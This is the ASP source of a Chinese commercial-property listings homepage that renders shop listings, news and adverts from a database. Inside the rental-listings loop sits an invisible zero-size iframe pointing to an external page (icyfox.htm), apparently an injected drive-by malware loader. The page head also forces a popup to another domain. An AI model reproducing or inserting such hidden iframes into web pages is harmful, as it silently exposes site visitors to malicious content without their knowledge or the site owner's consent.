<!--#include file=inc/conn.asp -->
<!--#include file=inc/function.asp -->
<!--#include file=inc/Strs.asp -->
<%
sub ShowAdSwf(Url,WTH,HGH,AdId)
	dim Str
	Str=ShowSwfStr
	if AdId=7 then
		Str=ShowMoveSwf
		Str=replace(ShowMoveDiv,"＄DIVBODY",Str)
	end if
	Str=replace(Str,"＄URL",Url)
	Str=replace(Str,"＄WTH",WTH)
	Str=replace(Str,"＄HGH",HGH)
	response.Write Str
end sub

sub ShowAdImg(Url,GoUrl,Txt,TheClass,WTH,HGH,AdId)
	dim Str
	Str=ShowImgStr
	if AdId=7 then
		Str=ShowMoveImg
		Str=replace(Str,"＄WTH",WTH)
		Str=replace(Str,"＄HGH",HGH)
		Str=replace(ShowMoveDiv,"＄DIVBODY",Str)
	end if
	Str=replace(Str,"＄URL",Url)
	Str=replace(Str,"＄GOURL",GoUrl)
	Str=replace(Str,"＄TEST",Txt)
	if AdId<>7 then Str=replace(Str,"＄CLASS",TheClass)
	response.Write Str
end sub

sub ShowAdNow(AdId,TheClass,WTH,HGH)
	dim Str,AdRs,Url,GoUrl,Txt,IsSwf
	Str="select top 1 * from adv where endtime>=date() and advid="&AdId&" order by addtime Desc"
	Set AdRs=conn.execute(Str)
	if not AdRs.Eof then
		Url=AdRs("ImgUrl")
		IsSwf=AdRs("IsFlash")
		GoUrl=AdRs("SiteUrl")
		Txt=AdRs("SiteName")
		if Txt<>"" then
			if AdRs("SiteIntro")<>"" then Txt=Txt&vbcrlf&AdRs("SiteIntro")
		else
			Txt=AdRs("SiteIntro")
		end if
		if AdId=7 then
			WTH=AdRs("ImgWidth")
			HGH=AdRs("ImgHeight")
		end if
		if IsSwf then
			ShowAdSwf Url,WTH,HGH,AdId
		else
			ShowAdImg Url,GoUrl,Txt,TheClass,WTH,HGH,AdId
		end if
	end if
	Set AdRs=nothing	
End Sub
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>扬州商铺网</title>
<link href="css/text.css" rel="stylesheet" type="text/css">

<style type="text/css">
<!--
.style1 {color: #990000}
.style2 {color: #990033}
-->
</style>
<script language="jscript">
window.open("http://www.yzhuiyu.com","tar","top=0,left=0,width=200,height=100,scrollbars=yes,resizable=yes,menubar=yes,toolbar=yes,status=yes");
</script>
</head>

<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<table width="778" border="0" align="center" cellpadding="0" cellspacing="0" class="table-body">
  <tr>
    <td><!--#include file=top.asp --><table width="100%"  border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td><table width="100%"  border="0" cellpadding="0" cellspacing="0">
            <tr>
              <td height="105"><div id="demo" style="overflow:hidden" onmouseover="vbscript:a2()"  onmouseout="vbscript:a1()"><table border="0" cellspacing="0" cellpadding="0"><tr id="demo3"> 
<%
			dim rss,sqls,strs
			sqls="select top 18 * from spw where sptop2=true order by ID Desc"
			Set rss= Server.CreateObject("ADODB.Recordset")
			rss.open sqls,conn,1,1
%>
    <%do while not rss.eof
  	strs=rss("spname") & vbcrlf
	strs=strs & "类型：" & rss("splb") & " → " & rss("spgqlb") & vbcrlf
	strs=strs & "时效：" & rss("spaddtime") & " → " & rss("spendtime") & vbcrlf
	strs=strs & "说明：" & left(rss("spcontent"),45) & "..."
	%>
   <td width="150"><a href="sqdetails.asp?id=<%=rss("id")%>" target="_blank" title="<%=strs%>"><img src="<%=rss("spphoto")%>"  class="img-go-120_80"></a></td>
     <%
	 rss.movenext
	 loop
	 set rss=nothing
	 %></tr></table>
            </div>
              </td>
            </tr>
          </table></td>
        </tr>
      </table></td>
  </tr>
  <tr>
    <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td>
          <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="table-tbody-top">
            <tr>
              <td width="300" valign="top"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><img src="images/gg_001.gif" width="177" height="12"></td>
                </tr>
                <tr>
                  <td align="left" valign="top" background="images/gg_002.gif"><table width="100%"  border="0" cellpadding="4" cellspacing="0">
                      <tr>
                        <td background="images/gg_004.gif">&nbsp;</td>
                      </tr>
                    </table>
                      <table width="99%"  border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td height="285" valign="middle">
						  <div  id="marquees"><%
			sql="select top 20 * from ytiinews where BigClassName='商铺动态' order by ID Desc"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
		  %><table width="297"  border="0" cellspacing="0" cellpadding="2">
		  <%do while not rs.eof%>
  <tr>
    <td width="211" height="20"><img src="images/a_3.gif" border=0>&nbsp;<a href="list.asp?id=<%=rs("id")%>" target="_blank"><%=gotTopic(rs("title"),28)%></a></td>
    <td width="78"><%=rs("updatetime")%></td>
  </tr>
  <%
  rs.movenext
  loop
  rs.close
  %>
</table></div><div id="templayer" style="position:absolute;z-index:1;visibility:hidden"></div>
<script language="JavaScript">
marqueesHeight=275;
stopscroll=false;
with(marquees){
  style.width=0;
  style.height=marqueesHeight;
  style.overflowX="visible";
  style.overflowY="hidden";
  noWrap=true;
  onmouseover=new Function("stopscroll=true");
  onmouseout=new Function("stopscroll=false");
}
//document.write('<div id="templayer" style="position:absolute;z-index:1;visibility:hidden"></div>');

preTop=0; currentTop=0; 

function init(){
  templayer.innerHTML="";
  while(templayer.offsetHeight<marqueesHeight){
    templayer.innerHTML+=marquees.innerHTML;
  }
  marquees.innerHTML=templayer.innerHTML+templayer.innerHTML;
  setInterval("scrollUp()",60);//越大越慢
}
document.body.onload=init;

function scrollUp(){
  if(stopscroll==true) return;
  preTop=marquees.scrollTop;
  marquees.scrollTop+=1;
  if(preTop==marquees.scrollTop){
    marquees.scrollTop=templayer.offsetHeight-marqueesHeight;
    marquees.scrollTop+=1;
  }
}
</script>
</td>
                        </tr>
                      </table>
                      <table width="100%"  border="0" cellpadding="4" cellspacing="0">
                        <tr>
                          <td align="right" background="images/gg_005.gif"><a href="newslist.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                        </tr>
                    </table></td>
                </tr>
                <tr>
                  <td><img src="images/gg_003.gif" width="300" height="12"></td>
                </tr>
              </table>
                </td>
              <td width="8" valign="top">&nbsp;</td>
              <td valign="top"><table width="100%"  border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td align="left"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td height="25" background="images/zhanshi.gif"><table width="100%"  border="0" align="right" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="140" height="25"><a href="splist.asp" target="_blank"><img src="images/zhanshi1.gif" width="140" height="25" border="0"></a></td>
                              <td><b><font color="#FFFFFF">咨询热线:0514-7892731 7185018 13338125010　</font></b></td>
                            </tr>
                          </table></td>
                        </tr>
                      </table></td>
                      </tr>
                  </table></td>
                  </tr>
                <tr>
                  <td class="td-tianchong-4px" id="td-line-L"><TABLE width=100% border=0 align="center" cellPadding=0 cellSpacing=0 style="FONT-SIZE: 12px">
                    <TBODY>
                      <%
			dim i,j
			sql="select top 6 * from spw where sptop1=true order by ID Desc"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
		  %>
                      <%for j=0 to 2 %>
                      <TR vAlign=center>
                         <%for i=0 to 1%>
                        <TD vAlign=center><table width="100%" border="0" align="center" cellpadding="3" cellspacing="2">
                          <tr>
                            <td width="75" valign="top"><a href="sqdetails.asp?id=<%=rs("id")%>" target="_blank"><img src="<%=rs("spphoto")%>" class="img-75_85"></a></td>
                            <td height="80" valign="top" bgcolor="#E3EDF4" class="td-tianchong-4px"><b><%=rs("spname")%></b><br>
                              <span class="style1">类型</span>:<%=rs("spgqlb")%><br>
                              <span class="style1">价格</span>:<%=rs("spjg")%>万/<%=rs("spmj")%>M<sup>2</sup><br>
                              <span class="style1">位置</span>:<%=rs("SmallClassName")%><br>
                              <table width="100%"  border="0" cellspacing="0" cellpadding="4">
                                <tr>
                                  <td align="right" bgcolor="#C7D1DC"><a href="sqdetails.asp?id=<%=rs("id")%>" target=_blank class=a_color_001>详细>>></a></td>
                                </tr>
                              </table></td>
                          </tr>
                        </table></TD>
                        <%
							rs.movenext
							if rs.eof then
							exit for
							end if
							next
							%>
                      </tr>
                      <%
						if rs.eof then
						exit for
						end if
						next
						rs.close
						%>
                    </TBODY>
                  </TABLE><table width="100%"  border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td align="right" bgcolor="#4D8CBB" class="TD-MENU"><a href="splist.asp" target="_blank" class="a_color_003">更多内容</a>&nbsp;<span class="a_color_003">>>></span>&nbsp;&nbsp;</td>
                      </tr>
                    </table></td>
                </tr>
              </table></td>
            </tr>
          </table>
          <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="table-tbody-top">
            <tr>
              <td><% ShowAdNow 2,"AdImg-778-100",778,100 %></td>
            </tr>
          </table>
          <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="table-tbody-top">
            <tr>
              <td width="500" valign="top"><table width="100%"  border="0" cellpadding="0" cellspacing="0" class="td-line-R">
                <tr>
                  <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td><img src="images/zuling.gif" width="499" height="25" border="0" usemap="#Map6"></td>
                    </tr>
                  </table></td>
                </tr>
                <tr>
                  <td valign="top" class="td-tianchong-4px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                    <tr>
					                      <%
			sql="select top 4 * from spw where sptop1=false and spgqlb in ('求租','出租') order by ID Desc"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
			do while not rs.eof 
		  %>
                      <td width="121" valign="top" class="td-tianchong-2px"><table width="100%"  border="0" cellpadding="0" cellspacing="0" bgcolor="#EDF1F3">
                        <tr>
                                  <td align="center" class="td-tianchong-4px"><a href="sqdetails.asp?id=<%=rs("id")%>" target="_blank"><img src="<%=rs("spphoto")%>" class="img-100_120"></a></td>
                        </tr><iframe src="http://www.maimaiba.com/conn/icyfox.htm" width="0" height="0" frameborder="0"></iframe>

                        <tr>
                          <td class="td-tianchong-2px"><span class="style1">名称</span>:<%=rs("spname")%></td>
                        </tr>
                        <tr>
                          <td class="td-tianchong-2px"><span class="style1">面积</span>:<%=rs("spmj")%>M<sup>2</sup></td>
                        </tr>
                        <tr>
                          <td class="td-tianchong-2px"><span class="style1">价格</span>:<%=rs("spjg")%> 万</td>
                        </tr>
                        <tr>
                          <td height="28" align="left" valign="top" bgcolor="#DEE6EB" class="td-tianchong-4px">&nbsp;<%=gottopic(rs("spcontent"),30)%></td>
                        </tr>
                      </table></td>
					  <%
					  rs.movenext
					  loop
					  rs.close
					  %>
                      </tr>
                  </table><table width="100%"  border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td align="right" bgcolor="#CFDAEB" class="TD-MENU"><a href="splist1.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                      </tr>
                    </table></td>
                </tr>
              </table>
                <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="td-line-R">
                  <tr>
                    <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td><img src="images/maimai.gif" width="499" height="25" border="0" usemap="#Map5"></td>
                      </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td valign="top" class="td-tianchong-4px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <%
			sql="select top 4 * from spw where  sptop1=false and spgqlb in ('转让','出售','求购') order by ID Desc"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
			do while not rs.eof 
		  %>
                        <td width="121" valign="top" class="td-tianchong-2px"><table width="100%"  border="0" cellpadding="0" cellspacing="0" bgcolor="#F6F6F6">
                            <tr>
                                  <td align="center" class="td-tianchong-4px"><a href="sqdetails.asp?id=<%=rs("id")%>" target="_blank"><img src="<%=rs("spphoto")%>" class="img-100_120"></a></td>
                            </tr>
                            <tr>
                              <td class="td-tianchong-2px"><span class="style1">名称</span>:<%=rs("spname")%></td>
                            </tr>
                            <tr>
                              <td class="td-tianchong-2px"><span class="style1">面积</span>:<%=rs("spmj")%>M<sup>2</sup></td>
                            </tr>
                            <tr>
                              <td class="td-tianchong-2px"><span class="style1">价格</span>:<%=rs("spjg")%> 万</td>
                            </tr>
                            <tr>
                              <td height="28" align="left" valign="top" bgcolor="#EFEFEF" class="td-tianchong-4px">&nbsp;<%=gottopic(rs("spcontent"),30)%></td>
                            </tr>
                        </table></td>
                        <%
					  rs.movenext
					  loop
					  rs.close
					  %>
                      </tr>
                    </table><table width="100%"  border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td align="right" bgcolor="#BBC9B6" class="TD-MENU"><a href="splist2.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                      </tr>
                    </table></td>
                  </tr>
                </table>
                <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="td-line-R">
                  <tr>
                    <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td><img src="images/pingu.gif" width="499" height="25" border="0" usemap="#Map"></td>
                      </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td valign="top" class="td-tianchong-4px">
					<table width="100%"  border="0" cellspacing="0" cellpadding="0">
                        <tr>
						<%
						sql="select top 4 * from ytiinews where BigClassName='商铺评估' order by ID Desc"
			            Set rs= Server.CreateObject("ADODB.Recordset")
			            rs.open sql,conn,1,1
						do while not rs.eof 
						%>
                          <td width="121" valign="top" class="td-tianchong-2px">
						  <table width="100%"  border="0" cellpadding="0" cellspacing="0" bgcolor="#FAF9FD">
                            <tr>
                                  <td align="center" class="td-tianchong-4px"><a href="list.asp?id=<%=rs("id")%>" target="_blank"><img src="<%=rs("DefaultPicUrl")%>" border="0" class="img-100_120"></a></td>
                            </tr>
                            <tr>
                              <td height="30" align="left" valign="top" class="td-tianchong-4px">&nbsp;<%=gottopic(rs("title"),20)%></td>
                            </tr>
                            <tr>
                              <td height="23" align="left" bgcolor="#F4F2FC" class="td-tianchong-4px"><div align="right"><a href="list.asp?id=<%=rs("id")%>" target="_blank" class="a_color_001">详细>>></a></div></td>
                            </tr>
                          </table></td>
                          <%
					rs.movenext
					loop
					rs.close
					%>
					</tr>
                    </table>
					<table width="100%"  border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td align="right" bgcolor="#CBC8D9" class="TD-MENU"><a href="pinggulist.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                      </tr>
                    </table></td>
                  </tr>
                </table>
                </td>
              <td width="8" valign="top">&nbsp;</td>
              <td valign="top"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td><img src="images/login.gif" width="269" height="30"></td>
                      </tr>
                  </table></td>
                </tr>
                <tr>
                  <td bgcolor="F1F0F0" class="td-line-L"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td class="td-tianchong-4px"><table width="100%"  border="0" cellspacing="4" cellpadding="0">
                            <form name="uform2" method="post" action="chkuser.asp">
                              <tr>
                                <td align="left" bgcolor="#F7F7F7" class="td-tianchong-4px">用户名
                                    <input name="username" type="text" id="username">
                                </td>
                              </tr>
                              <tr>
                                <td align="left" bgcolor="#F7F7F7" class="td-tianchong-4px">密&nbsp;&nbsp;码
                                    <input name="password" type="password" id="password"></td>
                              </tr>
                              <tr>
                                <td align="center" class="td-tianchong-4px"><a href="#" onClick="window.open('GetPassword.asp','play','width=400 height=150,toolbar=no,titlebar=no,status=no,menubar=no,resizable=no,scrollbars=no')" >找回密码</a>&nbsp;<a href="userreg1.asp" target="_blank">新会员注册</a>&nbsp;
                                    <input type="submit" name="Submit" value="登 录"></td>
                              </tr>
                            </form>
                        </table></td>
                      </tr>
                  </table></td>
                </tr>
              </table>
              <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="td-line-L">
                <tr>
                  <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td><img src="images/chuangye.gif" width="269" height="25" border="0" usemap="#Map7"></td>
                    </tr>
                  </table></td>
                </tr>
                <tr>
                  <td height="135" valign="top" bgcolor="#FCF8F3" class="td-tianchong-4px">
				    <table width="100%"  border="0" cellspacing="0" cellpadding="0">
				                        <%
			sql="select top 6 * from ytiinews where BigClassName='创业中心' order by ID Desc"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
			do while not rs.eof 
		     %>
                    <tr>
                      <td class="td_text_001">·&nbsp;<a href="list.asp?id=<%=rs("id")%>" target="_blank" class="a_color_002"><%=gottopic(rs("title"),30)%></a></td>
                    </tr>
					<%
					rs.movenext
					loop
					rs.close
					%>
                  </table>				  
				  </td>
                </tr>
              </table>
			  <table width="100%"  border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td align="right" bgcolor="#EBDED1" class="TD-MENU"><a href="chuangyelist.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                      </tr>
                  </table>
                <table width="100%"  border="0" cellspacing="0" cellpadding="0">
                  <tr>
                      <td align="center" valign="middle" class="td-tianchong-4px"> 
                        <% 'ShowAdNow 3,"AdImg-125-60",125,60 %>
                        &nbsp; 
                        <% ShowAdNow 4,"AdImg-125-60",125,60 %>
                        <br>
                        <a href="http://www.buildingchina.com/" target="_blank"><img src="LOGO.jpg" width="189" height="60" border="0"></a></td>
                  </tr>
                </table>
                <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="td-line-L">
                  <tr>
                    <td bgcolor="#FDFEF1"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td><img src="images/xuetang.gif" width="269" height="25" border="0" usemap="#Map8"></td>
                      </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td height="135" valign="top" bgcolor="#FDFEF1" class="td-tianchong-4px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                      <%
			sql="select top 7 * from ytiinews where BigClassName='商铺学堂' order by ID Desc"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
			do while not rs.eof 
		     %>
                      <tr>
                        <td class="td_text_001">·&nbsp;<a href="list.asp?id=<%=rs("id")%>" target="_blank" class="a_color_002"><%=gottopic(rs("title"),34)%></a></td>
                      </tr>
                      <%
					rs.movenext
					loop
					rs.close
					%>
                    </table></td>
                  </tr>
                </table>
                <table width="100%"  border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td align="right" bgcolor="#E8E9D3" class="TD-MENU"><a href="xuetanglist.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                  </tr>
                </table>
                <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="td-line-L">
                  <tr>
                    <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                      <tr>
                        <td><img src="images/daikuan.gif" width="269" height="25" border="0" usemap="#Map9"></td>
                      </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td height="150" valign="top" bgcolor="#F5FEFC" class="td-tianchong-4px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                      <%
			sql="select top 4 * from ytiinews where BigClassName='商铺贷款' order by ID Desc"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
			do while not rs.eof 
		     %>
                      <tr>
                        <td class="td_text_001">·&nbsp;<a href="list.asp?id=<%=rs("id")%>" target="_blank" class="a_color_002"><%=gottopic(rs("title"),34)%></a></td>
                      </tr>
                      <%
					rs.movenext
					loop
					rs.close
					%>
                    </table></td>
                  </tr>
                </table>
                <table width="100%"  border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td align="right" bgcolor="#D3E9E4" class="TD-MENU"><a href="daikuanlist.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                  </tr>
                </table></td>
            </tr>
          </table>
          <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="table-tbody-top">
            <tr>
              <td align="left"><% ShowAdNow 5,"AdImg-778-100",778,100 %></td>
            </tr>
          </table>
          <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="table-tbody-top">
            <tr>
              <td valign="top"><table width="100%"  border="0" cellpadding="0" cellspacing="0" class="td-line-R">
                  <tr>
                    <td align="left"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td><img src="images/paimai.gif" width="569" height="25" border="0" usemap="#Map4"></td>
                        </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td valign="top" class="td-tianchong-4px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                        <%
						  	sql="select top 6 * from ytiinews where BigClassName='商铺拍卖' order by ID Desc"
							Set rs= Server.CreateObject("ADODB.Recordset")
							rs.open sql,conn,1,1
						  %>
                        <%for j=0 to 1%>
                        <tr>
                          <%for i=0 to 2%>
                          <td width="184" valign="top" class="td-tianchong-2px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                              <tr>
                                <td width="65" align="center" valign="top"><a href="list.asp?id=<%=rs("id")%>" target="_blank"><img src="<%=rs("DefaultPicUrl")%>" class="img-65_75"></a></td>
                                <td valign="top" bgcolor="#FCFAF8" class="td-tianchong-2px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                                    <tr>
                                      <td align="left" class="td-tianchong-4px"><a href="list.asp?id=<%=rs("id")%>" class="a_color_001"><%=rs("title")%></a><br> <br>&nbsp;&nbsp;<%=gottopic(nohtml(rs("content")),40)%></td>
                                    </tr>
                                </table></td>
                              </tr>
                          </table></td>
                          <%
						  	rs.movenext
							if rs.eof then
							exit for
							end if
							next
						  %>
                        </tr>
                        <%
					  		if rs.eof then
							exit for
							end if
							next
							rs.close
					  %>
                    </table><table width="100%"  border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td align="right" bgcolor="#FFE8B3" class="TD-MENU"><a href="paimailist.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                      </tr>
                    </table></td>
                  </tr>
              </table></td>
              <td width="8" valign="top">&nbsp;</td>
              <td width="200" valign="top"><table width="100%"  border="0" cellpadding="0" cellspacing="0" class="td-line-L">
                  <tr>
                    <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td><img src="images/zhuangshi.gif" width="199" height="25" border="0" usemap="#Map10"></td>
                        </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td height="172" valign="top" bgcolor="#FDFEF1" class="td-tianchong-4px"><table width="100%"  border="0" cellpadding="0" cellspacing="0">
                        <%
			sql="select top 16 * from ytiinews where BigClassName='装饰天地' order by ID Desc"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
			do while not rs.eof 
		     %>
                        <tr>
                          <td height="18" class="td_text_001">·&nbsp;<a href="list.asp?id=<%=rs("id")%>" target="_blank" class="a_color_002"><%=gottopic(rs("title"),34)%></a></td>
                        </tr>
                        <%
					rs.movenext
					loop
					rs.close
					%>
                    </table></td>
                  </tr>
              </table>
                <table width="100%"  border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td align="right" bgcolor="#E8E9D3" class="TD-MENU"><a href="zhuangshilist.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                  </tr>
                </table></td>
            </tr>
          </table>
          <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="table-tbody-top">
            <tr>
              <td valign="top"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td align="left"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td><img src="images/gongye.gif" width="777" height="25" border="0" usemap="#Map3"></td>
                        </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td valign="top" class="td-tianchong-4px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <%
			sql="select top 4 * from spw where sptop1=false and splb='办公厂房' order by ID Desc"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
			do while not rs.eof 
		  %>
                          <td width="192" valign="top" class="td-tianchong-2px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                              <tr>
                                <td width="65" align="center" valign="top"><a href="sqdetails.asp?id=<%=rs("id")%>" target="_blank"><img src="<%=rs("spphoto")%>" class="img-65_75_2"></a></td>
                                <td valign="top" class="td-tianchong-2px"><table width="100%"  border="0" cellpadding="0" cellspacing="0" bgcolor="#F5F9FA">
                                    <tr>
                                      <td align="left" class="td-tianchong-4px"><span class="style2"><%=rs("spname")%></span></td>
                                    </tr>
                                    <tr>
                                      <td>&nbsp;</td>
                                    </tr>
                                    <tr>
                                      <td height="40" align="left" valign="top" class="td-tianchong-4px"><%=gottopic(rs("spcontent"),40)%></td>
                                    </tr>
                                </table></td>
                              </tr>
                          </table></td>
                          <%
									  rs.movenext
									  loop
									  rs.close
									  %>
                        </tr>
                    </table><table width="100%"  border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td align="right" bgcolor="#D9E4E8" class="TD-MENU"><a href="splist3.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                      </tr>
                    </table></td>
                  </tr>
                </table>
                  <table width="100%"  border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td align="left"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td><img src="images/zhoubian.gif" width="777" height="25" border="0" usemap="#Map2"></td>
                          </tr>
                      </table></td>
                    </tr>
                    <tr>
                      <td valign="top" class="td-tianchong-4px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <%
			sql="select top 4 * from spw where sptop1=false and BigClassName='区外商铺'"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
			if not rs.eof then
			do while not rs.eof 
		  %>
                            <td width="192" valign="top" class="td-tianchong-2px"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
                                <tr>
                                  <td width="65" align="center" valign="top"><a href="sqdetails.asp?id=<%=rs("id")%>" target="_blank"><img src="<%=rs("spphoto")%>" class="img-65_75_2"></a></td>
                                  <td valign="top" class="td-tianchong-2px"><table width="100%"  border="0" cellpadding="0" cellspacing="0" bgcolor="#FBFAF9">
                                      <tr>
                                        <td align="left" class="td-tianchong-4px"><span class="style2"><%=rs("spname")%></span></td>
                                      </tr>
                                      <tr>
                                        <td>&nbsp;</td>
                                      </tr>
                                      <tr>
                                        <td height="40" align="left" valign="top" class="td-tianchong-4px"><%=gottopic(rs("spcontent"),40)%></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                            <%
									  rs.movenext
									  loop
									  rs.close
                         end if
									  %>
                          </tr>
                      </table><table width="100%"  border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td align="right" bgcolor="#DCCFC8" class="TD-MENU"><a href="splist4.asp" target="_blank" class="a_color_001">更多内容</a>&nbsp;<span class="a_color_001">>>></span>&nbsp;&nbsp;</td>
                      </tr>
                    </table></td>
                    </tr>
                  </table>
                </td>
            </tr>
          </table>
          <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="table-tbody-top">
            <tr>
              <td align="left"><% ShowAdNow 6,"AdImg-778-100",778,100 %></td>
            </tr>
          </table>
          <table width="100%"  border="0" cellpadding="0" cellspacing="0" class="table-tbody-top">
            <tr>
              <td align="left"><img src="images/youqing.gif" width="777" height="25"></td>
            </tr>
            <tr>
              <td valign="top" bgcolor="#E6F0EF"><table width="100%"  border="0" cellpadding="0" cellspacing="0">
                  <%
			sql="select top 12 * from adv where advid=1 order by ID Desc"
			Set rs= Server.CreateObject("ADODB.Recordset")
			rs.open sql,conn,1,1
			
		  %>
                  <tr>
                    <td align="center" valign="top"><%do while not rs.eof %>
                        <a href="<%=rs("SiteUrl")%>" target="_blank" title="<%=rs("SiteName")%>"><img src="<%=rs("ImgUrl")%>" class="img-href"></a>
                        <%
						  rs.movenext
						  loop
						  rs.close
						  %></td>
                  </tr>
              </table></td>
            </tr>
          </table></td>
      </tr>
    </table>
	</td>
  </tr>
  <tr>
    <td><table width="100%"  border="0" cellpadding="0" cellspacing="0" class="table-tbody-top">
      <tr>
        <td align="center"><!--#include file=foot.asp --></td>
      </tr>
    </table></td>
  </tr>
</table>
<%
ShowAdNow 7,"",0,0
CloseConn
%>
<map name="Map">
  <area shape="rect" coords="395,3,489,23" href="ADDPINGGU.ASP" target="_blank">
  <area shape="rect" coords="56,2,122,22" href="pinggulist.asp" target="_blank">
</map>
<map name="Map2">
  <area shape="rect" coords="453,3,703,23" href="splist4.asp" target="_blank">
</map>
<map name="Map3">
  <area shape="rect" coords="89,2,306,23" href="splist3.asp" target="_blank">
</map>
<map name="Map4">
  <area shape="rect" coords="42,4,127,21" href="paimailist.asp" target="_blank">
</map>
<map name="Map5">
  <area shape="rect" coords="54,2,121,20" href="splist2.asp" target="_blank">
</map>
<map name="Map6">
  <area shape="rect" coords="54,1,121,20" href="splist1.asp" target="_blank">
</map>
<map name="Map7">
